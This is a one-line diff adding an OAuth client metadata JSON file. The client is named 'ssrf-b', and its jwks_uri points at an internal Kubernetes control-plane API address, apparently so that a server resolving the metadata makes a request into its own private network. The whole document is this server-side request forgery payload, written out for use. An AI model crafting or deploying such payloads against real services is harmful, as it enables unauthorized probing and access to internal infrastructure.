@@ -1,0 +1,1 @@
+{"client_id": "https://cdn.jsdelivr.net/gh/rpkl122/neon-cimd-meta@main/meta5b.json", "client_name": "ssrf-b", "redirect_uris": ["http://localhost:3000/cb5"], "token_endpoint_auth_method": "private_key_jwt", "grant_types": ["client_credentials"], "response_types": ["code"], "jwks_uri": "https://neon-control-plane-api.neon-control-plane.svc.cluster.local:9096/"}
